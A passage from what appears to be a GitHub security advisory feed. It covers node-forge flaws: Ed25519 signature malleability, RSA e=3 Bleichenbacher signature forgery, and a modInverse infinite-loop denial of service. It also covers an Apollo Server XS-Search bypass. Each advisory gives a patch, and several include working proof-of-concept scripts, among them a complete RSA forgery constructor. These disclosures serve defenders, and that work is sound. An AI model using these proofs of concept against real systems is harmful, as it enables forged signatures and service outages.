    carry = sum &gt;&gt; 8;
  }
  return { sig: out, carry };
}

function toSpkiPem(publicKeyBytes) {
  if (publicKeyBytes.length !== 32) {
    throw new Error('publicKeyBytes must be 32 bytes');
  }
  // Builds an ASN.1 SubjectPublicKeyInfo for Ed25519 (RFC 8410) and returns PEM.
  const oidEd25519 = Buffer.from([0x06, 0x03, 0x2b, 0x65, 0x70]);
  const algId = Buffer.concat([Buffer.from([0x30, 0x05]), oidEd25519]);
  const bitString = Buffer.concat([Buffer.from([0x03, 0x21, 0x00]), publicKeyBytes]);
  const spki = Buffer.concat([Buffer.from([0x30, 0x2a]), algId, bitString]);
  const b64 = spki.toString('base64').match(/.{1,64}/g).join('\n');
  return `-----BEGIN PUBLIC KEY-----\n${b64}\n-----END PUBLIC KEY-----\n`;
}

function verifyWithCrypto(publicKey, message, signature) {
  try {
    const keyObject = crypto.createPublicKey(toSpkiPem(publicKey));
    const ok = crypto.verify(null, message, keyObject, signature);
    return { ok };
  } catch (error) {
    return { ok: false, error: error.message };
  }
}

function toResult(label, original, tweaked) {
  return {
    [label]: {
      original_valid: original.ok,
      tweaked_valid: tweaked.ok,
    },
  };
}

function main() {
  const kp = ed.generateKeyPair();
  const sig = ed.sign({ message: MESSAGE, privateKey: kp.privateKey });
  const ok = ed.verify({ message: MESSAGE, signature: sig, publicKey: kp.publicKey });
  const tweaked = addLToS(sig);
  const okTweaked = ed.verify({
    message: MESSAGE,
    signature: tweaked.sig,
    publicKey: kp.publicKey,
  });
  const cryptoOriginal = verifyWithCrypto(kp.publicKey, MESSAGE, sig);
  const cryptoTweaked = verifyWithCrypto(kp.publicKey, MESSAGE, tweaked.sig);
  const result = {
    ...toResult('forge', { ok }, { ok: okTweaked }),
    ...toResult('crypto', cryptoOriginal, cryptoTweaked),
  };
  console.log(JSON.stringify(result, null, 2));
}

main();
</code></pre>
</details>

<h2 id="suggested-patch">Suggested Patch</h2>
<p>Add strict canonical scalar validation in Ed25519 verify path before scalar multiplication. (Parse S as little-endian 32-byte integer and reject if <code>S &gt;= L</code>).</p>
<p>Here is a patch we tested on our end to resolve the issue, though please verify it on your end:</p>
<pre><code class="language-diff">index f3e6faa..87eb709 100644
--- a/lib/ed25519.js
+++ b/lib/ed25519.js
@@ -380,6 +380,10 @@ function crypto_sign_open(m, sm, n, pk) {
     return -1;
   }

+  if(!_isCanonicalSignatureScalar(sm, 32)) {
+    return -1;
+  }
+
   for(i = 0; i &lt; n; ++i) {
     m[i] = sm[i];
   }
@@ -409,6 +413,21 @@ function crypto_sign_open(m, sm, n, pk) {
   return mlen;
 }

+function _isCanonicalSignatureScalar(bytes, offset) {
+  var i;
+  // Compare little-endian scalar S against group order L and require S &lt; L.
+  for(i = 31; i &gt;= 0; --i) {
+    if(bytes[offset + i] &lt; L[i]) {
+      return true;
+    }
+    if(bytes[offset + i] &gt; L[i]) {
+      return false;
+    }
+  }
+  // S == L is non-canonical.
+  return false;
+}
+
 function modL(r, x) {
   var carry, i, j, k;
   for(i = 63; i &gt;= 32; --i) {
</code></pre>
<h2 id="resources">Resources</h2>
<ul>
<li>RFC 8032 (Ed25519): <a href="https://datatracker.ietf.org/doc/html/rfc8032#section-8.4">https://datatracker.ietf.org/doc/html/rfc8032#section-8.4</a><ul>
<li><blockquote>
<p>Ed25519 and Ed448 signatures are not malleable due to the verification check that decoded S is smaller than l</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was discovered as part of a U.C. Berkeley security research project by: Austin Chu, Sohee Kim, and Corban Villa.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-q67f-28xg-22rw">https://github.com/digitalbazaar/forge/security/advisories/GHSA-q67f-28xg-22rw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35961">https://nvd.nist.gov/vuln/detail/CVE-2022-35961</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25793">https://nvd.nist.gov/vuln/detail/CVE-2026-25793</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/bdecf11571c9f1a487cc0fe72fe78ff6dfa96b85">https://github.com/digitalbazaar/forge/commit/bdecf11571c9f1a487cc0fe72fe78ff6dfa96b85</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc8032#section-8.4">https://datatracker.ietf.org/doc/html/rfc8032#section-8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-q67f-28xg-22rw">https://github.com/advisories/GHSA-q67f-28xg-22rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q67f-28xg-22rw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T22:04:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-forge] Forge has signature forgery in RSA-PKCS due to ASN.1 extra field  ]]></title>
        <id>https://github.com/advisories/GHSA-ppp5-5v6c-4jwp</id>
        <link href="https://github.com/advisories/GHSA-ppp5-5v6c-4jwp"/>
        <updated>2026-03-26T22:02:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>RSASSA PKCS#1 v1.5 signature verification accepts forged signatures for low public exponent keys (e=3). Attackers can forge signatures by stuffing “garbage” bytes within the ASN structure in order to construct a signature that passes verification, enabling <a href="https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/">Bleichenbacher style forgery</a>. This issue is similar to <a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765">CVE-2022-24771</a>, but adds bytes in an addition field within the ASN structure, rather than outside of it. </p>
<p>Additionally, forge does not validate that signatures include a minimum of 8 bytes of padding as <a href="https://datatracker.ietf.org/doc/html/rfc2313#section-8">defined by the specification</a>, providing attackers additional space to construct Bleichenbacher forgeries. </p>
<h2 id="impacted-deployments">Impacted Deployments</h2>
<p><strong>Tested commit:</strong> <code>8e1d527fe8ec2670499068db783172d4fb9012e5</code>
<strong>Affected versions:</strong> tested on v1.3.3 (latest release) and recent prior versions.</p>
<p><strong>Configuration assumptions:</strong></p>
<ul>
<li>Invoke key.verify with defaults (default <code>scheme</code> uses RSASSA-PKCS1-v1_5).</li>
<li><code>_parseAllDigestBytes: true</code> (default setting).</li>
</ul>
<h2 id="root-cause">Root Cause</h2>
<p>In <code>lib/rsa.js</code>, <code>key.verify(...)</code>, forge decrypts the signature block, decodes PKCS#1 v1.5 padding (<code>_decodePkcs1_v1_5</code>), parses ASN.1, and compares <code>capture.digest</code> to the provided digest.</p>
<p>Two issues are present with this logic:</p>
<ol>
<li>Strict DER byte-consumption (<code>_parseAllDigestBytes</code>) only guarantees all bytes are parsed, not that the parsed structure is the canonical minimal DigestInfo shape expected by RFC 8017 verification semantics. A forged EM with attacker-controlled additional ASN.1 content inside the parsed container can still pass forge verification while OpenSSL rejects it.</li>
<li><code>_decodePkcs1_v1_5</code> comments mention that PS &lt; 8 bytes should be rejected, but does not implement this logic.</li>
</ol>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<ol>
<li>Use Node.js (tested with <code>v24.9.0</code>) and clone <code>digitalbazaar/forge</code> at commit <code>8e1d527fe8ec2670499068db783172d4fb9012e5</code>.</li>
<li>Place and run the PoC script (<code>repro_min.js</code>) with <code>node repro_min.js</code> in the same level as the <code>forge</code> folder.</li>
<li>The script generates a fresh RSA keypair (<code>4096</code> bits, <code>e=3</code>), creates a normal control signature, then computes a forged candidate using cube-root interval construction.</li>
<li>The script verifies both signatures with:</li>
</ol>
<ul>
<li>forge verify (<code>_parseAllDigestBytes: true</code>), and</li>
<li>Node/OpenSSL verify (<code>crypto.verify</code> with <code>RSA_PKCS1_PADDING</code>).</li>
</ul>
<ol start="7">
<li>Confirm output includes:</li>
</ol>
<ul>
<li><code>control-forge-strict: true</code></li>
<li><code>control-node: true</code></li>
<li><code>forgery (forge library, strict): true</code></li>
<li><code>forgery (node/OpenSSL): false</code></li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p><strong>Overview:</strong></p>
<ul>
<li>Demonstrates a valid control signature and a forged signature in one run.</li>
<li>Uses strict forge parsing mode explicitly (<code>_parseAllDigestBytes: true</code>, also forge default).</li>
<li>Uses Node/OpenSSL as an differential verification baseline.</li>
<li>Observed output on tested commit:</li>
</ul>
<pre><code class="language-text">control-forge-strict: true
control-node: true
forgery (forge library, strict): true
forgery (node/OpenSSL): false
</code></pre>
<details><summary>repro_min.js</summary>

<pre><code class="language-javascript">#!/usr/bin/env node
'use strict';

const crypto = require('crypto');
const forge = require('./forge/lib/index');

// DER prefix for PKCS#1 v1.5 SHA-256 DigestInfo, without the digest bytes:
// SEQUENCE {
//   SEQUENCE { OID sha256, NULL },
//   OCTET STRING &lt;32-byte digest&gt;
// }
// Hex: 30 0d 06 09 60 86 48 01 65 03 04 02 01 05 00 04 20
const DIGESTINFO_SHA256_PREFIX = Buffer.from(
  '300d060960864801650304020105000420',
  'hex'
);

const toBig = b =&gt; BigInt('0x' + (b.toString('hex') || '0'));
function toBuf(n, len) {
  let h = n.toString(16);
  if (h.length % 2) h = '0' + h;
  const b = Buffer.from(h, 'hex');
  return b.length &lt; len ? Buffer.concat([Buffer.alloc(len - b.length), b]) : b;
}
function cbrtFloor(n) {
  let lo = 0n;
  let hi = 1n;
  while (hi * hi * hi &lt;= n) hi &lt;&lt;= 1n;
  while (lo + 1n &lt; hi) {
    const mid = (lo + hi) &gt;&gt; 1n;
    if (mid * mid * mid &lt;= n) lo = mid;
    else hi = mid;
  }
  return lo;
}
const cbrtCeil = n =&gt; {
  const f = cbrtFloor(n);
  return f * f * f === n ? f : f + 1n;
};
function derLen(len) {
  if (len &lt; 0x80) return Buffer.from([len]);
  if (len &lt;= 0xff) return Buffer.from([0x81, len]);
  return Buffer.from([0x82, (len &gt;&gt; 8) &amp; 0xff, len &amp; 0xff]);
}

function forgeStrictVerify(publicPem, msg, sig) {
  const key = forge.pki.publicKeyFromPem(publicPem);
  const md = forge.md.sha256.create();
  md.update(msg.toString('utf8'), 'utf8');
  try {
    // verify(digestBytes, signatureBytes, scheme, options):
    // - digestBytes: raw SHA-256 digest bytes for `msg`
    // - signatureBytes: binary-string representation of the candidate signature
    // - scheme: undefined =&gt; default RSASSA-PKCS1-v1_5
    // - options._parseAllDigestBytes: require DER parser to consume all bytes
    //   (this is forge's default for verify; set explicitly here for clarity)
    return { ok: key.verify(md.digest().getBytes(), sig.toString('binary'), undefined, { _parseAllDigestBytes: true }) };
  } catch (err) {
    return { ok: false, err: err.message };
  }
}

function main() {
  const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 4096,
    publicExponent: 3,
    privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
    publicKeyEncoding: { type: 'pkcs1', format: 'pem' }
  });

  const jwk = crypto.createPublicKey(publicKey).export({ format: 'jwk' });
  const nBytes = Buffer.from(jwk.n, 'base64url');
  const n = toBig(nBytes);
  const e = toBig(Buffer.from(jwk.e, 'base64url'));
  if (e !== 3n) throw new Error('expected e=3');

  const msg = Buffer.from('forged-message-0', 'utf8');
  const digest = crypto.createHash('sha256').update(msg).digest();
  const algAndDigest = Buffer.concat([DIGESTINFO_SHA256_PREFIX, digest]);

  // Minimal prefix that forge currently accepts: 00 01 00 + DigestInfo + extra OCTET STRING.
  const k = nBytes.length;
  // ffCount can be set to any value at or below 111 and produce a valid signature.
  // ffCount should be rejected for values below 8, since that would constitute a malformed PKCS1 package.
  // However, current versions of node forge do not check for this.
  // Rejection of packages with less than 8 bytes of padding is bad but does not constitute a vulnerability by itself.
  const ffCount = 0; 
  // `garbageLen` affects DER length field sizes, which in turn affect how
  // many bytes remain for garbage. Iterate to a fixed point so total EM size is exactly `k`.
  // A small cap (8) is enough here: DER length-size transitions are discrete
  // and few (&lt;128, &lt;=255, &lt;=65535, ...), so this stabilizes quickly.
  let garbageLen = 0;
  for (let i = 0; i &lt; 8; i += 1) {
    const gLenEnc = derLen(garbageLen).length;
    const seqLen = algAndDigest.length + 1 + gLenEnc + garbageLen;
    const seqLenEnc = derLen(seqLen).length;
    const fixed = 2 + ffCount + 1 + 1 + seqLenEnc + algAndDigest.length + 1 + gLenEnc;
    const next = k - fixed;
    if (next === garbageLen) break;
    garbageLen = next;
  }
  const seqLen = algAndDigest.length + 1 + derLen(garbageLen).length + garbageLen;
  const prefix = Buffer.concat([
    Buffer.from([0x00, 0x01]),
    Buffer.alloc(ffCount, 0xff),
    Buffer.from([0x00]),
    Buffer.from([0x30]), derLen(seqLen),
    algAndDigest,
    Buffer.from([0x04]), derLen(garbageLen)
  ]);

  // Build the numeric interval of all EM values that start with `prefix`:
  // - `low`  = prefix || 00..00
  // - `high` = one past (prefix || ff..ff)
  // Then find `s` such that s^3 is inside [low, high), so EM has our prefix.
  const suffixLen = k - prefix.length;
  const low = toBig(Buffer.concat([prefix, Buffer.alloc(suffixLen)]));
  const high = low + (1n &lt;&lt; BigInt(8 * suffixLen));
  const s = cbrtCeil(low);
  if (s &gt; cbrtFloor(high - 1n) || s &gt;= n) throw new Error('no candidate in interval');

  const sig = toBuf(s, k);

  const controlMsg = Buffer.from('control-message', 'utf8');
  const controlSig = crypto.sign('sha256', controlMsg, {
    key: privateKey,
    padding: crypto.constants.RSA_PKCS1_PADDING
  });

  // forge verification calls (library under test)
  const controlForge = forgeStrictVerify(publicKey, controlMsg, controlSig);
  const forgedForge = forgeStrictVerify(publicKey, msg, sig);

  // Node.js verification calls (OpenSSL-backed reference behavior)
  const controlNode = crypto.verify('sha256', controlMsg, {
    key: publicKey,
    padding: crypto.constants.RSA_PKCS1_PADDING
  }, controlSig);
  const forgedNode = crypto.verify('sha256', msg, {
    key: publicKey,
    padding: crypto.constants.RSA_PKCS1_PADDING
  }, sig);

  console.log('control-forge-strict:', controlForge.ok, controlForge.err || '');
  console.log('control-node:', controlNode);
  console.log('forgery (forge library, strict):', forgedForge.ok, forgedForge.err || '');
  console.log('forgery (node/OpenSSL):', forgedNode);
}

main();
</code></pre>
</details>

<h2 id="suggested-patch">Suggested Patch</h2>
<ul>
<li>Enforce PKCS#1 v1.5 BT=0x01 minimum padding length (<code>PS &gt;= 8</code>) in <code>_decodePkcs1_v1_5</code> before accepting the block.</li>
<li>Update the RSASSA-PKCS1-v1_5 verifier to require canonical DigestInfo structure only (no extra attacker-controlled ASN.1 content beyond expected fields).</li>
</ul>
<p>Here is a Forge-tested patch to resolve the issue, though it should be verified for consumer projects:</p>
<pre><code class="language-diff">index b207a63..ec8a9c1 100644
--- a/lib/rsa.js
+++ b/lib/rsa.js
@@ -1171,6 +1171,14 @@ pki.setRsaPublicKey = pki.rsa.setPublicKey = function(n, e) {
             error.errors = errors;
             throw error;
           }
+
+          if(obj.value.length != 2) {
+            var error = new Error(
+              'DigestInfo ASN.1 object must contain exactly 2 fields for ' +
+              'a valid RSASSA-PKCS1-v1_5 package.');
+            error.errors = errors;
+            throw error;
+          }
           // check hash algorithm identifier
           // see PKCS1-v1-5DigestAlgorithms in RFC 8017
           // FIXME: add support to validator for strict value choices
@@ -1673,6 +1681,10 @@ function _decodePkcs1_v1_5(em, key, pub, ml) {
       }
       ++padNum;
     }
+
+    if (padNum &lt; 8) {
+      throw new Error('Encryption block is invalid.');
+    }
   } else if(bt === 0x02) {
     // look for 0x00 byte
     padNum = 0;
</code></pre>
<h2 id="resources">Resources</h2>
<ul>
<li>RFC 2313 (PKCS v1.5): <a href="https://datatracker.ietf.org/doc/html/rfc2313#section-8">https://datatracker.ietf.org/doc/html/rfc2313#section-8</a><ul>
<li><blockquote>
<p>This limitation guarantees that the length of the padding string PS is at least eight octets, which is a security condition.</p>
</blockquote>
</li>
</ul>
</li>
<li>RFC 8017: <a href="https://www.rfc-editor.org/rfc/rfc8017.html">https://www.rfc-editor.org/rfc/rfc8017.html</a></li>
<li><code>lib/rsa.js</code> <code>key.verify(...)</code> at lines ~1139-1223.</li>
<li><code>lib/rsa.js</code> <code>_decodePkcs1_v1_5(...)</code> at lines ~1632-1695.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>This vulnerability was discovered as part of a U.C. Berkeley security research project by: Austin Chu, Sohee Kim, and Corban Villa.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765">https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765</a></li>
<li><a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-ppp5-5v6c-4jwp">https://github.com/digitalbazaar/forge/security/advisories/GHSA-ppp5-5v6c-4jwp</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc2313#section-8">https://datatracker.ietf.org/doc/html/rfc2313#section-8</a></li>
<li><a href="https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE">https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc8017.html">https://www.rfc-editor.org/rfc/rfc8017.html</a></li>
<li><a href="https://github.com/advisories/GHSA-ppp5-5v6c-4jwp">https://github.com/advisories/GHSA-ppp5-5v6c-4jwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ppp5-5v6c-4jwp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T22:02:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-forge] Forge has Denial of Service via Infinite Loop in BigInteger.modInverse() with Zero Input]]></title>
        <id>https://github.com/advisories/GHSA-5m6q-g25r-mvwx</id>
        <link href="https://github.com/advisories/GHSA-5m6q-g25r-mvwx"/>
        <updated>2026-03-26T21:57:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A Denial of Service (DoS) vulnerability exists in the node-forge library due to an infinite loop in the BigInteger.modInverse() function (inherited from the bundled jsbn library). When modInverse() is called with a zero value as input, the internal Extended Euclidean Algorithm enters an unreachable exit condition, causing the process to hang indefinitely and consume 100% CPU.
Affected Package</p>
<p>Package name: node-forge (npm: node-forge)
Repository: <a href="https://github.com/digitalbazaar/forge">https://github.com/digitalbazaar/forge</a>
Affected versions: All versions (including latest)
Affected file: lib/jsbn.js, function bnModInverse()
Root cause component: Bundled copy of the jsbn (JavaScript Big Number) library</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>Type: Denial of Service (DoS)
CWE: CWE-835 (Loop with Unreachable Exit Condition)
Attack vector: Network (if the application processes untrusted input that reaches modInverse)
Privileges required: None
User interaction: None
Impact: Availability (process hangs indefinitely)
Suggested CVSS v3.1 score: 5.3–7.5 (depending on the context of usage)</p>
<h2 id="root-cause-analysis">Root Cause Analysis</h2>
<p>The BigInteger.prototype.modInverse(m) function in lib/jsbn.js implements the Extended Euclidean Algorithm to compute the modular multiplicative inverse of this modulo m.
Mathematically, the modular inverse of 0 does not exist — gcd(0, m) = m ≠ 1 for any m &gt; 1. However, the implementation does not check whether the input value is zero before entering the algorithm's main loop. When this equals 0, the algorithm's loop condition is never satisfied for termination, resulting in an infinite loop.
The relevant code path in lib/jsbn.js:</p>
<pre><code class="language-js">javascriptfunction bnModInverse(m) {
  // ... setup ...
  // No check for this == 0
  // Enters Extended Euclidean Algorithm loop that never terminates when this == 0
}
</code></pre>
<h2 id="attack-scenario">Attack Scenario</h2>
<p>Any application using node-forge that passes attacker-controlled or untrusted input to a code path involving modInverse() is vulnerable. Potential attack surfaces include:</p>
<p>DSA/ECDSA signature verification — A crafted signature with s = 0 would trigger s.modInverse(q), causing the verifier to hang.
Custom RSA or Diffie-Hellman implementations — Applications performing modular arithmetic with user-supplied parameters.
Any cryptographic protocol where an attacker can influence a value that is subsequently passed to modInverse().</p>
<p>A single malicious request can cause the Node.js event loop to block indefinitely, rendering the entire application unresponsive.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Environment Setup</p>
<pre><code class="language-bash">mkdir forge-poc &amp;&amp; cd forge-poc
npm init -y
npm install node-forge
</code></pre>
<p>Reproduction (poc.js)
A single script that safely detects the vulnerability using a child process with timeout. The parent process is never at risk of hanging.</p>
<pre><code class="language-bash">mkdir forge-poc &amp;&amp; cd forge-poc
npm init -y
npm install node-forge
# Save the script below as poc.js, then run:
node poc.js
</code></pre>
<pre><code class="language-javascript">'use strict';
const { spawnSync } = require('child_process');

const childCode = `
  const forge = require('node-forge');
  // jsbn may not be auto-loaded; try explicit require if needed
  if (!forge.jsbn) {
    try { require('node-forge/lib/jsbn'); } catch(e) {}
  }
  if (!forge.jsbn || !forge.jsbn.BigInteger) {
    console.error('ERROR: forge.jsbn.BigInteger not available');
    process.exit(2);
  }
  const BigInteger = forge.jsbn.BigInteger;
  const zero = new BigInteger('0', 10);
  const mod = new BigInteger('3', 10);
  // This call should throw or return 0, but instead loops forever
  const inv = zero.modInverse(mod);
  console.log('returned: ' + inv.toString());
`;

console.log('[*] Testing: BigInteger(0).modInverse(3)');
console.log('[*] Expected: throw an error or return quickly');
console.log('[*] Spawning child process with 5s timeout...');
console.log();

const result = spawnSync(process.execPath, ['-e', childCode], {
  encoding: 'utf8',
  timeout: 5000,
});

if (result.error &amp;&amp; result.error.code === 'ETIMEDOUT') {
  console.log('[VULNERABLE] Child process timed out after 5s');
  console.log('  -&gt; modInverse(0, 3) entered an infinite loop (DoS confirmed)');
  process.exit(0);
}

if (result.status === 2) {
  console.log('[ERROR] Could not access BigInteger:', result.stderr.trim());
  console.log('  -&gt; Check your node-forge installation');
  process.exit(1);
}

if (result.status === 0) {
  console.log('[NOT VULNERABLE] modInverse returned:', result.stdout.trim());
  process.exit(1);
}

console.log('[NOT VULNERABLE] Child exited with error (status ' + result.status + ')');
if (result.stderr) console.log('  stderr:', result.stderr.trim());
process.exit(1);
</code></pre>
<p>Expected Output</p>
<pre><code>[*] Testing: BigInteger(0).modInverse(3)
[*] Expected: throw an error or return quickly
[*] Spawning child process with 5s timeout...

[VULNERABLE] Child process timed out after 5s
  -&gt; modInverse(0, 3) entered an infinite loop (DoS confirmed)
Verified On
</code></pre>
<p>node-forge v1.3.1 (latest at time of writing)
Node.js v18.x / v20.x / v22.x
macOS / Linux / Windows</p>
<h2 id="impact">Impact</h2>
<p>Availability: An attacker can cause a complete Denial of Service by sending a single crafted input that reaches the modInverse() code path. The Node.js process will hang indefinitely, blocking the event loop and making the application unresponsive to all subsequent requests.
Scope: node-forge is a widely used cryptographic library with millions of weekly downloads on npm. Any application that processes untrusted cryptographic parameters through node-forge may be affected.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add a zero-value check at the entry of bnModInverse() in lib/jsbn.js:</p>
<pre><code class="language-javascript">function bnModInverse(m) {
  var ac = m.isEven();
  // Add this check:
  if (this.signum() == 0) {
    throw new Error('BigInteger has no modular inverse: input is zero');
  }
  // ... rest of the existing implementation ...
}
</code></pre>
<p>Alternatively, return BigInteger.ZERO if that behavior is preferred, though throwing an error is more mathematically correct and consistent with other BigInteger implementations (e.g., Java's BigInteger.modInverse() throws ArithmeticException).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-5m6q-g25r-mvwx">https://github.com/digitalbazaar/forge/security/advisories/GHSA-5m6q-g25r-mvwx</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/9bb8d67b99d17e4ebb5fd7596cd699e11f25d023">https://github.com/digitalbazaar/forge/commit/9bb8d67b99d17e4ebb5fd7596cd699e11f25d023</a></li>
<li><a href="https://github.com/advisories/GHSA-5m6q-g25r-mvwx">https://github.com/advisories/GHSA-5m6q-g25r-mvwx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5m6q-g25r-mvwx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T21:57:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apollo-server-core] Apollo Server: Browser bug allows for bypass of XS-Search (read-only Cross-Site Request Forgery) prevention]]></title>
        <id>https://github.com/advisories/GHSA-9q82-xgwf-vj6h</id>
        <link href="https://github.com/advisories/GHSA-9q82-xgwf-vj6h"/>
        <updated>2026-03-26T21:53:12.000Z</updated>
        <content type="html"><![CDATA[<h1 id="impact">Impact</h1>
<p>In a Cross-Site Request Forgery attack, untrusted web content causes browsers to send authenticated requests to web servers which use cookies for authentication. While the web content is prevented from reading the request's response due to the Cross-Origin Request Sharing (CORS) protocol, an attacker may be able to cause side effects in the server ("CSRF" attack), or learn something about the response via timing analysis ("XS-Search" attack).</p>
<p>Apollo Server has a built-in feature which prevents CSRF and XS-Search attacks: it refuses to process GraphQL requests that could possibly have been sent by a spec-compliant web browser without a protective "preflight" step. See <a href="https://www.apollographql.com/docs/apollo-server/security/cors">Apollo Server's docs</a> for more details on CORS, CSRF attacks, and Apollo Server's CSRF prevention feature.</p>
<p>This feature is fully effective against attacks carried out against users of spec-compliant browsers. Unfortunately, a major browser introduced a bug in 2025 which meant in certain cases, it failed to follow the CORS spec. The browser's maintainers have already committed to fixing the bug and making the browser spec-compliant again.</p>
<p>Even with this bug, Apollo Server's CSRF prevention feature <strong>blocks</strong> "side effect" CSRF attacks: Apollo Server will still correctly refuse to execute <em>mutations</em> in requests that were not preflighted. However, some specially crafted authenticated GraphQL <em>queries</em> can be issued across origins <em>without preflight</em> in buggy versions of this browser, allowing for XS-Search attacks: an attacker can analyze response times to learn facts about the responses to requests such as whether fields return null or approximately how many list entries are returned from fields.</p>
<p>GraphQL servers are only vulnerable if they rely on cookies (or HTTP Basic Auth) for authentication.</p>
<h2 id="patches">Patches</h2>
<p>The vulnerability is patched in <code>@apollo/server</code> v5.5.0. This release contains a single change: GraphQL requests sent in HTTP <code>GET</code> requests which contain a <code>Content-Type</code> header naming a type other than <code>application/json</code> are rejected. (<code>GET</code> requests with no <code>Content-Type</code> are allowed.) This change prevents XS-Search attacks even in browsers which are non-compliant in ways similar to this browser.</p>
<p>There are no known cases where GraphQL apps depend on the ability of clients to send non-empty <code>Content-Type</code> headers with GET requests other than <code>application/json</code>, so this change has not been made configurable; if this change breaks a use case, <a href="https://github.com/apollographql/apollo-server/issues">file an issue</a> and more configurability can be added.</p>
<p>Apollo is not currently providing a patch for previous major versions of Apollo Server, which are all <a href="https://www.apollographql.com/docs/apollo-server/previous-versions">end-of-life</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not possible, this particular browser's bug can be mitigated by preventing any HTTP request with a <code>Content-Type</code> header containing <code>message/</code> from reaching Apollo Server (e.g. in a proxy or middleware).</p>
<p>For example, when using Apollo Server's Express integration, something like this can be placed <em>before</em> attaching <code>expressMiddleware</code> to the <code>app</code>:</p>
<pre><code class="language-js">app.use((req, res, next) =&gt; {
  for (let i = 0; i &lt; req.rawHeaders.length - 1; i += 2) {
    if (
      req.rawHeaders[i].toLowerCase() === 'content-type' &amp;&amp;
      req.rawHeaders[i + 1].includes('message/')
    ) {
      return res.status(415).json({ error: 'Content-Type not allowed' });
    }
  }
  next();
});
</code></pre>
<p>While the patch prevents a broader class of similar issues, the only known way to exploit this vulnerability is against a particular browser which currently plans to ship a fix in May 2026. If it is already past June 2026 and this vulnerability has not been addressed yet, it is likely that the system is not currently vulnerable. Upgrading to the latest version of Apollo Server is still recommended for the broader protection.</p>
<h2 id="resources">Resources</h2>
<p>The browser bug causes a similar vulnerability in Apollo Router; see <a href="https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p">https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/apollographql/apollo-server/security/advisories/GHSA-9q82-xgwf-vj6h">https://github.com/apollographql/apollo-server/security/advisories/GHSA-9q82-xgwf-vj6h</a></li>
<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p">https://github.com/apollographql/router/security/advisories/GHSA-hff2-gcpx-8f4p</a></li>
<li><a href="https://github.com/apollographql/apollo-server/commit/ada12001c4e95b5c779d80314a5a32e33087b5cf">https://github.com/apollographql/apollo-server/commit/ada12001c4e95b5c779d80314a5a32e33087b5cf</a></li>
<li><a href="https://github.com/apollographql/apollo-server/releases/tag/@apollo/server@5.5.0">https://github.com/apollographql/apollo-server/releases/tag/@apollo/server@5.5.0</a></li>
<li><a href="https://www.apollographql.com/docs/apollo-server/previous-versions">https://www.apollographql.com/docs/apollo-server/previous-versions</a></li>
<li><a href="https://github.com/advisories/GHSA-9q82-xgwf-vj6h">https://github.com/advisories/GHSA-9q82-xgwf-vj6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q82-xgwf-vj6h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T21:53:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@apollo/server] Apollo Server: Browser bug allows for bypass of XS-Search (read-only Cross-Site Request Forgery) prevention]]></title>
        <id>https://github.com/advisories/GHSA-9q82-xgwf-vj6h</id>
        <link href="https://github.com/advisories/GHSA-9q82-xgwf-vj6h"/>
        <updated>2026-03-26T21:53:12.000Z</updated>
        <content type="html"><![CDATA[<h1 id="impact">Impact</h1>
